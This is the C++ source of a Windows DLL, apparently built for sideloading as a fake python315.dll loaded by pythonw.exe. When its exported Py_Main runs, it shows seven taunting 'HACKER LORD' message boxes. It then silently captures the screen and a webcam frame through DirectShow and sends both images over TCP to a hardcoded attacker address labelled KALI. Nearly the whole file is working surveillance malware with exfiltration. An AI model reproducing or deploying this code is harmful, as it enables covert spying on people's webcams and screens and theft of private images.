#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <WS2tcpip.h>
#include <vector>
#include <thread>
#include <dshow.h>

#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")

#define KALI_IP "192.168.35.128"
#define KALI_PORT 4444

//Kich ban: Chay pythonw.exe -> goi python315.dll -> Open WebCam, Camera
//                                                -> This just a trap, you're trapped! HAHA

void ShowBox(int id) {
    wchar_t msg[64];
    swprintf(msg, 64, L"THIS JUST A TRAP HAHAHAHAHAHAHA\n HAHHAHAHAHAHAHAHHAHAHA\n HAHAHAHAHAHHAHAHA #%d", id);
    MessageBoxW(NULL, msg, L"HACKER LORD", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
}

//Chay trap 7 messagebox()
void trap() {
    for (int i = 1; i <= 7; i++) {
        std::thread(ShowBox, i).detach(); 
        Sleep(100); 
    }
}

MIDL_INTERFACE("0579154A-2B53-4994-B0D0-E773148EFF85")
ISampleGrabberCB : public IUnknown{
public:
    virtual HRESULT STDMETHODCALLTYPE SampleCB(double, IMediaSample*) = 0;
    virtual HRESULT STDMETHODCALLTYPE BufferCB(double, BYTE*, long) = 0;
};

MIDL_INTERFACE("6B652FFF-11FE-4fce-92AD-0266B5D7C78F")
ISampleGrabber : public IUnknown{
public:
    virtual HRESULT STDMETHODCALLTYPE SetOneShot(BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetMediaType(const AM_MEDIA_TYPE*) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetConnectedMediaType(AM_MEDIA_TYPE*) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetBufferSamples(BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCurrentBuffer(long*, long*) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCurrentSample(IMediaSample**) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetCallback(ISampleGrabberCB*, long) = 0;
};

static const CLSID CLSID_SampleGrabber = { 0xC1F400A0,0x3F08,0x11d3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37} };
static const CLSID CLSID_NullRenderer = { 0xC1F400A4,0x3F08,0x11d3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37} };

//Nhan frame raw RGB24 tu DirectShow ===
class FrameGrabber : public ISampleGrabberCB {
public:
    std::vector<BYTE> data;
    volatile bool     got = false;
    LONG              ref = 1;

    STDMETHODIMP QueryInterface(REFIID riid, void** ppv) {
        if (riid == __uuidof(ISampleGrabberCB) || riid == IID_IUnknown) {
            *ppv = static_cast<ISampleGrabberCB*>(this);
            AddRef(); return S_OK;
        }
        return E_NOINTERFACE;
    }
    STDMETHODIMP_(ULONG) AddRef() { return InterlockedIncrement(&ref); }
    STDMETHODIMP_(ULONG) Release() {
        ULONG r = InterlockedDecrement(&ref);
        if (!r) delete this;
        return r;
    }
    STDMETHODIMP SampleCB(double, IMediaSample*) { return S_OK; }
    STDMETHODIMP BufferCB(double, BYTE* buf, long len) {
        if (!got && buf && len > 0) {
            data.assign(buf, buf + len);
            got = true;
        }
        return S_OK;
    }
};

//Capture webcam bang DirectShow
std::vector<char> CaptureWebcam() {
    std::vector<char> result;
    CoInitialize(NULL);

    IGraphBuilder* pGraph = nullptr;
    ICaptureGraphBuilder2* pCapture = nullptr;
    ICreateDevEnum* pDevEnum = nullptr;
    IEnumMoniker* pEnum = nullptr;
    IMoniker* pMoniker = nullptr;
    IBaseFilter* pCam = nullptr;
    IBaseFilter* pGrabF = nullptr;
    IBaseFilter* pNull = nullptr;
    ISampleGrabber* pGrab = nullptr;
    IMediaControl* pCtrl = nullptr;
    FrameGrabber* cb = nullptr;

    auto cleanup = [&]() {
        if (pCtrl)    pCtrl->Release();
        if (pGrab)    pGrab->Release();
        if (pNull)    pNull->Release();
        if (pGrabF)   pGrabF->Release();
        if (pCam)     pCam->Release();
        if (pMoniker) pMoniker->Release();
        if (pEnum)    pEnum->Release();
        if (pDevEnum) pDevEnum->Release();
        if (pCapture) pCapture->Release();
        if (pGraph)   pGraph->Release();
        if (cb)       cb->Release();
        CoUninitialize();
        };

    //Tao filter graph
    if (FAILED(CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER,
        IID_IGraphBuilder, (void**)&pGraph))) {
        cleanup(); return result;
    }
    if (FAILED(CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER,
        IID_ICaptureGraphBuilder2, (void**)&pCapture))) {
        cleanup(); return result;
    }
    pCapture->SetFiltergraph(pGraph);

    //Find webcam
    if (FAILED(CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
        IID_ICreateDevEnum, (void**)&pDevEnum))) {
        cleanup(); return result;
    }
    if (FAILED(pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0))
        || !pEnum) {
        cleanup(); return result;
    }
    if (pEnum->Next(1, &pMoniker, NULL) != S_OK) { cleanup(); return result; }

    if (FAILED(pMoniker->BindToObject(NULL, NULL, IID_IBaseFilter, (void**)&pCam)))
    {
        cleanup(); return result;
    }
    pGraph->AddFilter(pCam, L"Webcam");

    //Tao SampleGrabber filter
    if (FAILED(CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER,
        IID_IBaseFilter, (void**)&pGrabF))) {
        cleanup(); return result;
    }
    if (FAILED(pGrabF->QueryInterface(__uuidof(ISampleGrabber), (void**)&pGrab)))
    {
        cleanup(); return result;
    }

    //Output RGB
    AM_MEDIA_TYPE mt = {};
    mt.majortype = MEDIATYPE_Video;
    mt.subtype = MEDIASUBTYPE_RGB24;
    pGrab->SetMediaType(&mt);
    pGrab->SetOneShot(FALSE);
    pGrab->SetBufferSamples(FALSE);

    //Register callback
    cb = new FrameGrabber();
    pGrab->SetCallback(cb, 1); // 1 = BufferCB

    //Build graph: Webcam → SampleGrabber → NullRenderer
    pGraph->AddFilter(pGrabF, L"Grabber");
    if (FAILED(CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER,
        IID_IBaseFilter, (void**)&pNull))) {
        cleanup(); return result;
    }
    pGraph->AddFilter(pNull, L"Null");

    if (FAILED(pCapture->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video,
        pCam, pGrabF, pNull))) {
        cleanup(); return result;
    }

    //Get size frame
    AM_MEDIA_TYPE cmt = {};
    pGrab->GetConnectedMediaType(&cmt);
    VIDEOINFOHEADER* vih = (VIDEOINFOHEADER*)cmt.pbFormat;
    int w = vih->bmiHeader.biWidth;
    int h = abs((int)vih->bmiHeader.biHeight);

    //Wait for callback
    if (FAILED(pGraph->QueryInterface(IID_IMediaControl, (void**)&pCtrl)))
    {
        if (cmt.pbFormat) CoTaskMemFree(cmt.pbFormat); cleanup(); return result;
    }
    pCtrl->Run();
    for (int i = 0; i < 30 && !cb->got; i++) Sleep(100);
    pCtrl->Stop();

    //Build BMP tu raw RGB24 data
    if (cb->got && !cb->data.empty() && w > 0 && h > 0) {
        DWORD rowStride = ((w * 3 + 3) & ~3);
        DWORD pixelSize = rowStride * h;

        BITMAPFILEHEADER bf = {};
        bf.bfType = 0x4D42;
        bf.bfOffBits = sizeof(bf) + sizeof(BITMAPINFOHEADER);
        bf.bfSize = bf.bfOffBits + pixelSize;

        BITMAPINFOHEADER bi = {};
        bi.biSize = sizeof(bi);
        bi.biWidth = w;
        bi.biHeight = h;  // DirectShow = bottom-up → positive height
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = pixelSize;

        result.resize(bf.bfSize);
        memcpy(result.data(), &bf, sizeof(bf));
        memcpy(result.data() + sizeof(bf), &bi, sizeof(bi));

        int srcStride = w * 3;
        for (int y = 0; y < h; y++) {
            memcpy(result.data() + bf.bfOffBits + y * rowStride,
                cb->data.data() + y * srcStride,
                srcStride);
        }
    }

    if (cmt.pbFormat) CoTaskMemFree(cmt.pbFormat);
    cleanup();
    return result;
}

//Take screen → send data BMP trong RAM
std::vector<char> CaptureScreen() {
    HDC hScreen = GetDC(NULL);
    HDC hMem = CreateCompatibleDC(hScreen);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    HGDIOBJ hOld = SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);
    SelectObject(hMem, hOld);

    //Initialize BITMAPINFOHEADER
    BITMAPINFOHEADER bi = {};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;      // top-down
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    DWORD rowSize = ((w * 3 + 3) & ~3);
    DWORD pixelSize = rowSize * h;

    std::vector<char> pixels(pixelSize);
    GetDIBits(hMem, hBmp, 0, h, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    //BITMAPFILEHEADER + BITMAPINFOHEADER + pixel data
    BITMAPFILEHEADER bf = {};
    bf.bfType = 0x4D42; // 'BM'
    bf.bfOffBits = sizeof(bf) + sizeof(bi);
    bf.bfSize = bf.bfOffBits + pixelSize;

    std::vector<char> result(bf.bfSize);
    memcpy(result.data(), &bf, sizeof(bf));
    memcpy(result.data() + sizeof(bf), &bi, sizeof(bi));
    memcpy(result.data() + bf.bfOffBits, pixels.data(), pixelSize);

    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
    return result;
}

void SendAll(std::vector<std::vector<char>> dataList) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in srv = {};
    srv.sin_family = AF_INET;
    srv.sin_port = htons(KALI_PORT);
    InetPtonA(AF_INET, KALI_IP, &srv.sin_addr);

    if (connect(sock, (SOCKADDR*)&srv, sizeof(srv)) == SOCKET_ERROR) {
        closesocket(sock); WSACleanup(); return;
    }

    for (auto& data : dataList) {
        DWORD size = (DWORD)data.size();
        send(sock, (char*)&size, sizeof(DWORD), 0);

        int sent = 0;
        while (sent < (int)size) {
            int n = send(sock, data.data() + sent, size - sent, 0);
            if (n <= 0) break;
            sent += n;
        }
    }

    closesocket(sock);
    WSACleanup();
}

void testCam() {
    std::vector<char> cam = CaptureWebcam();
    if (cam.empty()) {
        MessageBoxW(NULL, L"WEBCAM NULL!", L"Debug", MB_OK);
    }
    else {
        HANDLE hf = CreateFileA("C:\\Windows\\Temp\\cam_test.bmp",
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD written;
        WriteFile(hf, cam.data(), cam.size(), &written, NULL);
        CloseHandle(hf);
        MessageBoxW(NULL, L"Saved cam_test.bmp!", L"Debug", MB_OK);
    }
}

extern "C" {
    __declspec(dllexport) void Py_Main() {
        //testCam();
        SetProcessDPIAware();
        trap();
        SendAll({ CaptureScreen(), CaptureWebcam() });
        while (true) {

        }
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

